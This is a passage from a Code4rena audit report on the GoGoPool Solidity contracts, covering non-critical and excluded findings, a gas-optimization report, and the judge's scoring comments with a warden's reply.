File: /contracts/contract/ProtocolDAO.sol

102  	function getClaimingContractPct(string memory claimingContract) public view returns (uint256) {
103  		return getUint(keccak256(abi.encodePacked("ProtocolDAO.ClaimingContractPct.", claimingContract)));
104  	}
105  
106  	/// @notice Set the percentage a contract is owed for a rewards cycle
107  	function setClaimingContractPct(string memory claimingContract, uint256 decimal) public onlyGuardian valueNotGreaterThanOne(decimal) {
108  		setUint(keccak256(abi.encodePacked("ProtocolDAO.ClaimingContractPct.", claimingContract)), decimal);
109: 	}

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L102-L109

## [N&#x2011;05] Confusing function name
Consider changing the name to `stakeGGPAs` or `stakeGGPFor`.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/Staking.sol

328: 	function restakeGGP(address stakerAddr, uint256 amount) public onlySpecificRegisteredContract("ClaimNodeOp", msg.sender) {

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328

## [N&#x2011;06] Misplaced punctuation
There's an extra comma - it looks like a find-and-replace error.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/Vault.sol

154  		// Update balances
155  		tokenBalances[contractKey] = tokenBalances[contractKey] - amount;
156  		// Get the toke ERC20 instance
157  		ERC20 tokenContract = ERC20(tokenAddress);
158  		// Withdraw to the withdrawal address, , safeTransfer will revert if it fails
159  		tokenContract.safeTransfer(withdrawalAddress, amount);
160: 	}

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Vault.sol#L154-L160

## [N&#x2011;07] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions
See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/TokenggAVAX.sol

24:   contract TokenggAVAX is Initializable, ERC4626Upgradeable, UUPSUpgradeable, BaseUpgradeable {

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24

## [N&#x2011;08] Import declarations should import specific identifiers, rather than the whole file
Using import declarations of the form `import {<identifier_name>} from "some/file.sol"` avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation.

*There are 13 instances of this issue. (For in-depth details on this and all further issues with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-12-gogopool-findings/issues/728).)*

## [N&#x2011;09] Missing `initializer` modifier on constructor
OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/BaseUpgradeable.sol

9:    contract BaseUpgradeable is Initializable, BaseAbstract {

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/BaseUpgradeable.sol#L9

## [N&#x2011;10] The `nonReentrant` `modifier` should occur before all other modifiers
This is a best-practice to protect against reentrancy in other modifiers.

*There are 2 instances of this issue.*

## [N&#x2011;11] `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/TokenggAVAX.sol

255:  	function _authorizeUpgrade(address newImplementation) internal override onlyGuardian {}

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L255

## [N&#x2011;12] `constant`s should be defined rather than using magic numbers
Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.

*There are 2 instances of this issue.*

## [N&#x2011;13] Missing event and or timelock for critical parameter change
Events help non-contract tools to track changes, and events prevent users from being surprised by changes.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/Storage.sol

41    	function setGuardian(address newAddress) external {
42    		// Check tx comes from current guardian
43    		if (msg.sender != guardian) {
44    			revert MustBeGuardian();
45    		}
46    		// Store new address awaiting confirmation
47    		newGuardian = newAddress;
48:   	}

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L41-L48

## [N&#x2011;14] Events that mark critical parameter changes should contain both the old and the new value
This should especially be done if the new value is not required to be different from the old value.

*There are 2 instances of this issue.*

## [N&#x2011;15] Use a more recent version of solidity
Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol

2:    pragma solidity >=0.8.0;

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L2

## [N&#x2011;16] Use a more recent version of solidity
- Use a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`.
- Use a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol

2:    pragma solidity >=0.8.0;

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L2

## [N&#x2011;17] Constant redefined elsewhere
Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.

*There are 2 instances of this issue.*

## [N&#x2011;18] Lines are too long
Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/ProtocolDAO.sol

41:   		setUint(keccak256("ProtocolDAO.InflationIntervalRate"), 1000133680617113500); // 5% annual calculated on a daily interval - Calculate in js example: let dailyInflation = web3.utils.toBN((1 + 0.05) ** (1 / (365)) * 1e18);

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L41

## [N&#x2011;19] Variable names that consist of all capital letters should be reserved for `constant`/`immutable` variables
If the variable needs to be different based on which class it comes from, a `view`/`pure` *function* should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).

*There are 2 instances of this issue.*

## [N&#x2011;20] Using `>`/`>=` without specifying an upper bound is unsafe
There _will_ be breaking changes in future versions of solidity, and at that point your code will no longer be compatable. While you may have the specific version to use in a configuration file, others that include your source files may not.

*There are 2 instances of this issue.*

## [N&#x2011;21] Typos

*There are 3 instances of this issue.*

## [N&#x2011;22] File is missing NatSpec

*There are 3 instances of this issue.*

## [N&#x2011;23] NatSpec is incomplete

*There are 27 instances of this issue.*

## [N&#x2011;24] Not using the named return variables anywhere in the function is confusing
Consider changing the variable to be an unnamed one.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/MinipoolManager.sol

/// @audit mp
572:  	function getMinipoolByNodeID(address nodeID) public view returns (Minipool memory mp) {

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L572

## [N&#x2011;25] Contracts should have full test coverage
While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit.

*There is 1 instance of this issue:*

```solidity
File: Various Files

```

## [N&#x2011;26] Large or complicated code bases should implement fuzzing tests
Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement [fuzzing tests](https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05). Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly.

*There is 1 instance of this issue:*

```solidity
File: Various Files

```

## [N&#x2011;27] Function ordering does not follow the Solidity style guide
According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern.

*There are 15 instances of this issue.*

## [N&#x2011;28] Contract does not follow the Solidity style guide's suggested layout ordering
The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions, but the contract(s) below do not follow this ordering.

*There are 9 instances of this issue.*

## [N&#x2011;29] Open TODOs
Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/MinipoolManager.sol

412:  		// TODO Revisit this logic if we ever allow unequal matched funds

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L412

## Excluded findings
These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.

### Low Risk Issues
| |Issue|Instances|
|-|:-|:-:|
| [L&#x2011;08] | Missing checks for `address(0x0)` when assigning values to `address` state variables | 1 | 
| [L&#x2011;09] | `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()` | 155 | 

Total: 156 instances over 2 issues

### Non-critical Issues
| |Issue|Instances|
|-|:-|:-:|
| [N&#x2011;30] | Return values of `approve()` not checked | 2 | 
| [N&#x2011;31] | `public` functions not called by the contract should be declared `external` instead | 54 | 
| [N&#x2011;32] | Event is missing `indexed` fields | 26 | 

Total: 82 instances over 3 issues

### [L&#x2011;08] Missing checks for `address(0x0)` when assigning values to `address` state variables

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/Storage.sol

/// @audit (valid but excluded finding)
47:   		newGuardian = newAddress;

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L47

### [L&#x2011;09] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`
Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). "Unless there is a compelling reason, `abi.encode` should be preferred". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).

If all arguments are strings and or bytes, `bytes.concat()` should be used instead.

*There are 155 instances of this issue.*

### [N&#x2011;30] Return values of `approve()` not checked
Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything.

*There are 2 instances of this issue.*

### [N&#x2011;31] `public` functions not called by the contract should be declared `external` instead
Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.

*There are 54 instances of this issue.*

### [N&#x2011;32] Event is missing `indexed` fields
Index event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

*There are 26 instances of this issue.*

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/728#issuecomment-1404109188):**
 > **[L‑01] Inflation not locked for four years**<br>
> Refactor. Code as is will revert after 4 years, so it's enforced via config.
> 
 > **[L‑02] Contract will stop functioning in the year 2106**<br>
> Low
> 
 > **[L‑03] Lower-level initializations should come first**<br>
> Refactor in lack of specific risk
> 
 > **[L‑04] Incorrect percentage conversion**<br>
> Low
> 
 > **[L‑05] Loss of precision**<br>
> Low
> 
 > **[L‑06] Signatures vulnerable to malleability attacks**<br>
> Low
>
 > **[L‑07] require() should be used instead of assert()**<br>
> Refactor
> 
 > **[N‑01] Common code should be refactored**<br>
> Refactor
> 
 > **[N‑02] String constants used in multiple places should be defined as constants**<br>
> Refactor
> 
 > **[N‑03] Constants in comparisons should appear on the left side**<br>
> Refactor
> 
 > **[N‑04] Inconsistent address separator in storage names**<br>
> Non-Critical
> 
 > **[N‑05] Confusing function name**<br>
> Non-Critical
> 
 > **[N‑06] Misplaced punctuation**<br>
> Non-Critical
> 
 > **[N‑07] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions**<br>
> Disputing for TokenAvax as it's the child contract
> 
 > **[N‑08] Import declarations should import specific identifiers, rather than the whole file**<br>
> Non-Critical
> 
 > **[N‑09] Missing initializer modifier on constructor**<br>
> Refactor
> 
 > **[N‑10] The nonReentrant modifier should occur before all other modifiers**<br>
> Refactor
> 
 > **[N‑11] override function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings**<br>
> Non-Critical
> 
 > **[N‑12] constants should be defined rather than using magic numbers**<br>
> Refactor
> 
 > **[N‑13] Missing event and or timelock for critical parameter change**<br>
> Non-Critical
> 
 > **[N‑14] Events that mark critical parameter changes should contain both the old and the new value**<br>
> Non-Critical
> 
 > **[N‑15] Use a more recent version of solidity**<br>
> Non-Critical
> 
 > **[N‑16] Use a more recent version of solidity**<br>
> See N-15
> 
 > **[N‑17] Constant redefined elsewhere**<br>
> Refactor
> 
 > **[N‑18] Lines are too long**<br>
> Non-Critical
> 
 > **[N‑19] Variable names that consist of all capital letters should be reserved for constant/immutable variables**<br>
> Refactor
> 
 > **[N‑20] Using >/>= without specifying an upper bound is unsafe**<br>
> Refactor
> 
 > **[N‑21] Typos**<br>
> Non-Critical
> 
 > **[N‑22] File is missing NatSpec**<br>
> Non-Critical
> 
 > **[N‑23] NatSpec is incomplete**<br>
> Non-Critical
> 
 > **[N‑24] Not using the named return variables anywhere in the function is confusing**<br>
> Refactor
> 
 > **[N‑25] Contracts should have full test coverage**<br>
> Refactor
> 
 > **[N‑26] Large or complicated code bases should implement fuzzing tests**<br>
> Refactor
> 
 > **[N‑27] Function ordering does not follow the Solidity style guide**<br>
> Non-Critical
> 
 > **[N‑28] Contract does not follow the Solidity style guide's suggested layout ordering**<br>
> Non-Critical
> 
 > **[N-29] Open TODOs**<br>
> Non-Critical

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/728#issuecomment-1416111377):**
 > 6 Low, 15 Refactor, 15 Non-Critical, including downgraded findings ([\#733](https://github.com/code-423n4/2022-12-gogopool-findings/issues/733) & [\#734](https://github.com/code-423n4/2022-12-gogopool-findings/issues/734)).
>
 > Best report by far, so far I thought the second best was the best (this one scores above 100%).
> 
> Well played.



***

# Gas Optimizations

For this contest, 12 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125) by **NoamYakov** received the top score from the judge.

*The following wardens also submitted reports: [c3phas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/821), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/793), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/727), [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/582), [ast3ros](https://github.com/code-423n4/2022-12-gogopool-findings/issues/509), [camdengrieh](https://github.com/code-423n4/2022-12-gogopool-findings/issues/318), [shark](https://github.com/code-423n4/2022-12-gogopool-findings/issues/203), [latt1ce](https://github.com/code-423n4/2022-12-gogopool-findings/issues/137), [fatherOfBlocks](https://github.com/code-423n4/2022-12-gogopool-findings/issues/62), [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/49), and [kartkhira](https://github.com/code-423n4/2022-12-gogopool-findings/issues/40).*

## Summary

| |Issue|Instances|Total Gas Saved|
|-|:-|:-:|:-:|
| [G&#x2011;01] | State variables can be packed into fewer storage slots | 1 |  - |
| [G&#x2011;02] | Use a more recent version of solidity | 2 |  - |
| [G&#x2011;03] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 10 |  600 |
| [G&#x2011;04] | `internal` functions only called once can be inlined to save gas | 4 |  80 |
| [G&#x2011;05] | Functions guaranteed to revert when called by normal users can be marked `payable` | 62 |  1302 |
| [G&#x2011;06] | Optimize names to save gas | 13 |  286 |
| [G&#x2011;07] | Use custom errors rather than `revert()`/`require()` strings to save gas | 4 |  200 |
| [G&#x2011;08] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 7 |  595 |
| [G&#x2011;09] | Multiple accesses of a mapping/array should use a local variable cache | 4 |  168 |
| [G&#x2011;10] | State variables should be cached in stack variables rather than re-reading them from storage | 11 |  1067 |
| [G&#x2011;11] | Modification of `getX()`, `setX()`, `deleteX()`, `addX()` and `subX()` in `BaseAbstract.sol` increases gas savings in [G&#x2011;10] | 116 |  11252 |
| [G&#x2011;12] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-=` too) | 12 |  1356 |
| [G&#x2011;13] | Division by two should use bit shifting | 1 |  20 |
| [G&#x2011;14] | The result of function calls should be cached rather than re-calling the function | 2 |  200 |
| [G&#x2011;15] | Don't compare boolean expressions to boolean literals | 3 |  27 |
| [G&#x2011;16] | Splitting `require()` statements that use `&&` saves gas | 1 |  3 |
| [G&#x2011;17] | Stack variable used as a cheaper cache for a state variable is only used once | 3 | 9 |

Total: 256 instances over 17 issues with **17165 gas** saved.

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.

## [G&#x2011;01] State variables can be packed into fewer storage slots
If variables occupying the same slot are both written by the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper.

*There is 1 instance of this issue:*

```solidity
File: contracts\contract\tokens\TokenggAVAX.sol

/// @audit currently, `lastSync`, `rewardsCycleLength` and `rewardsCycleEnd` are
/// 	stored in a single storage slot and `lastRewardsAmt` is in another one.
/// 	Since all of these state variables except for `rewardsCycleLength` are
/// 	being set together (in `syncRewards()`), I suggest to reorder them so
/// 	that they will use the same storage slot and `rewardsCycleLength` will
/// 	use a different one.
40  	/// @notice the effective start of the current cycle
41  	uint32 public lastSync;
42  
43  	/// @notice the maximum length of a rewards cycle
44  	uint32 public rewardsCycleLength;
45  
46  	/// @notice the end of the current cycle. Will always be evenly divisible by `rewardsCycleLength`.
47  	uint32 public rewardsCycleEnd;
48  
49  	/// @notice the amount of rewards distributed in a the most recent cycle.
50  	uint192 public lastRewardsAmt;
```

## [G&#x2011;02] Use a more recent version of solidity
- Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining.
- Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads.
- Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings.
- Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.

*There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125).)*

## [G&#x2011;03] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops
The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.

*There are 10 instances of this issue.*

## [G&#x2011;04] `internal` functions only called once can be inlined to save gas
Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.

*There are 4 instances of this issue.*

## [G&#x2011;05] Functions guaranteed to revert when called by normal users can be marked `payable`
If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are 
`CALLVALUE`(2), `DUP1`(3), `ISZERO`(3), `PUSH2`(3), `JUMPI`(10), `PUSH1`(3), `DUP1`(3), `REVERT`(0), `JUMPDEST`(1), `POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.

*There are 62 instances of this issue.*

## [G&#x2011;06] Optimize names to save gas
`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).

*There are 13 instances of this issue.*

## [G&#x2011;07] Use custom errors rather than `revert()`/`require()` strings to save gas
Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.

*There are 4 instances of this issue.*

## [G&#x2011;08] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement
`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`.

*There are 7 instances of this issue.*

## [G&#x2011;09] Multiple accesses of a mapping/array should use a local variable cache
The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata.

*There are 4 instances of this issue.*

## [G&#x2011;10] State variables should be cached in stack variables rather than re-reading them from storage
The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

*There are 11 instances of this issue.*

## [G&#x2011;11] Modification of `getX()`, `setX()`, `deleteX()`, `addX()` and `subX()` in `BaseAbstract.sol` increases gas savings in [G&#x2011;10]
Modify the `getX()`, `setX()`, `deleteX()`, `addX()` and `subX()` functions in `BaseAbstract.sol` to receive the address of the `Storage` contract as an argument. This modification will create dozens more fixable instances of [G&#x2011;10].

*There are 116 instances of this issue.*

## [G&#x2011;12] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-=` too)
Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**. Subtructions act the same way.

*There are 12 instances of this issue.*

## [G&#x2011;13] Division by two should use bit shifting
`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two.

*There is 1 instance of this issue:*

```solidity
File: contracts\contract\MinipoolManager.sol

413 		uint256 avaxHalfRewards = avaxTotalRewardAmt / 2;
```

## [G&#x2011;14] The result of function calls should be cached rather than re-calling the function
The instances below point to the second+ call of the function within a single function. _Every_ external call made to a contract incurs at least **100 gas** of overhead.

*There are 2 instances of this issue.*

## [G&#x2011;15] Don't compare boolean expressions to boolean literals
`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`.

*There are 3 instances of this issue.*

## [G&#x2011;16] Splitting `require()` statements that use `&&` saves gas
See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**.

*There is 1 instance of this issue:*

```solidity
File: contracts\contract\tokens\upgradeable\ERC20Upgradeable.sol

154 			require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");
```

## [G&#x2011;17] Stack variable used as a cheaper cache for a state variable is only used once
If the variable is only accessed once, it's cheaper to use the state variable directly that one time, and save the **3 gas** the extra stack assignment would spend.

*There are 3 instances of this issue.*

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1400481524):**
 > **[G‑01] State variables can be packed into fewer storage slots**<br>
> Not awarding as it will only save gas at deploy time
> 
> **[G‑02] Use a more recent version of solidity**<br>
> Skipping as missing further info
> 
> **[G‑03] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in for- and while-loops**<br>
> 25 &ast; 7
> 
> **[G‑04] internal functions only called once can be inlined to save gas**<br>
> 16 per instance<br>
> 4 &ast; 16
> 
> **[G‑05] Functions guaranteed to revert when called by normal users can be marked payable**<br>
> Ignoring
> 
> **[G‑06] Optimize names to save gas**<br>
> Ignoring
> 
> **[G‑07] Use custom errors rather than `revert()`/`require()` strings to save gas**<br>
> Ignoring for lack of proven benchmarks
> 
> **[G‑08] Add unchecked {} for subtractions where the operands cannot underflow because of a previous `require()` or if-statement**<br>
> 7 &ast; 20
> 
> **[G‑09] Multiple accesses of a mapping/array should use a local variable cache**<br>
> 2 are "normal" to avoid the -= or += the other 2 are valid<br>
> 2 &ast; 100
> 
> **[G‑10] State variables should be cached in stack variables rather than re-reading them from storage**<br>
> 11 &ast; 100
> 
> **[G‑11] Modification of `getX()`, `setX()`, `deleteX()`, `addX()` and `subX()` in BaseAbstract.sol increases gas savings in [G‑10]**<br>
> Am understanding this as the idea of inlining the call rather than using a function.<br>
> 16 &ast; 116
> 
> 1856
> 
> **[G‑12] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (-= too)**<br>
> Out of scope
> 
> **[G‑13] Division by two should use bit shifting**<br>
> Equivalent to using unchecked
> 
> 20
> 
> **[G‑14] The result of function calls should be cached rather than re-calling the function**<br>
> 340 &ast; 2
> 
> 680
> 
> **[G‑15] Don't compare boolean expressions to boolean literals**<br>
> 27
> 
> **[G‑16] Splitting require() statements that use && saves gas**<br>
> Marginal
> 
> **[G‑17] Stack variable used as a cheaper cache for a state variable is only used once**<br>
> Marginal
> 
 > Total: 4262

**[NoamYakov (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416791198):**
 > >  **[G‑11] Modification of `getX()`, `setX()`, `deleteX()`, `addX()` and `subX()` in BaseAbstract.sol increases gas savings in [G‑10]**<br>
> > Am understanding this as the idea of inlining the call rather than using a function
> > 16 &ast; 116
> 
> This wasn't what I meant. I meant that each of these functions accesses the `gogoStorage` state variable (SLOAD). Therefore, when there's more than one call to this group of functions (for example, `setUint()` followed by another `setUint()`, or `setUint()` followed by `getAddress()`), it would me much cheaper to cache that state variable (`gogoStorage`) and pass it to the these functions. This way, there will be only one SLOAD.
> 
> In my gas report, I flagged the second+ calls to this group of functions as instances, since this optimization can spare an SLOAD in each of these calls. There are 116 instances, each saves 100 gas (like in G-10) - meaning a total saving of 11600 gas.
> 
> > **[G‑12] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (-= too)**<br>
> > Out of scope
> 
> Why is that out-of-scope? The `TokenggAVAX.sol` and `ERC20Upgradeable.sol` contracts are in scope, and this optimization wasn't included in the C4audit output.
> 
> Overall, My gas report saves an additional amount of 12956 gas. So the total gas savings are **17218 gas**. Therefore, I believe my gas report should be the one selected for the report. 

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416805415):**
 > @NoamYakov - Thank you for the comment, to clarify regarding G-11, are you saying to cache the address of Storage or to make it Immutable as to avoid the extra SLOAD?
> 
> The += is a knee jerk reaction I have in judging and have judged it as OOS for all reports.<br>
